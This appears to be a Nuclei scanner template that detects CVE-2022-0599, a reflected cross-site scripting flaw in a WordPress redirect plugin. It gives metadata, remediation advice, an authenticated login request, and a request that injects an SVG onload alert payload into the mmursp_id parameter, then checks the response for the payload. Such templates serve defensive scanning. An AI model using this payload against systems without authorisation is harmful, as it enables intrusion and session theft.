id: CVE-2022-0599

info:
  name: WordPress Mapping Multiple URLs Redirect Same Page <=5.8 - Cross-Site Scripting
  author: scent2d
  severity: medium
  description: |
    WordPress Mapping Multiple URLs Redirect Same Page plugin 5.8 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the mmursp_id parameter before outputting it back in an admin page.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to potential session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Update to the latest version of the WordPress Mapping Multiple URLs Redirect Same Page plugin (version 5.8 or higher) to mitigate this vulnerability.
  reference:
    - https://wpscan.com/vulnerability/4f1d45bc-d3bd-472c-959d-05abeff32765
    - https://wordpress.org/plugins/mapping-multiple-urls-redirect-same-page/
    - https://nvd.nist.gov/vuln/detail/cve-2022-0599
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-0599
    cwe-id: CWE-79
    epss-score: 0.00106
    epss-percentile: 0.42838
    cpe: cpe:2.3:a:mapping_multiple_urls_redirect_same_page_project:mapping_multiple_urls_redirect_same_page:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 2
    vendor: mapping_multiple_urls_redirect_same_page_project
    product: mapping_multiple_urls_redirect_same_page
    framework: wordpress
  tags: cve,cve2022,wordpress,wp-plugin,xss,wp,authenticated,wpscan,mapping_multiple_urls_redirect_same_page_project

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      - |
        GET /wp-admin/admin.php?page=mmursp-list&view=edit&mmursp_id="><svg/onload=alert(document.domain)> HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(header_2, "text/html")'
        condition: and

      - type: word
        part: body
        words:
          - 'id="mmursp_id" value="\"><svg/onload=alert(document.domain)>" />'
# digest: 4a0a0047304502203d66b6ad8e3b1d39233cb271999f5a84fbfb73184d8133cd10fdacd3030abb82022100a4f2ef86a5f9db35418a55b81851a77911908e17bf4ac7de5d974781de6f4b45:922c64590222798bb761d5b6d8e72950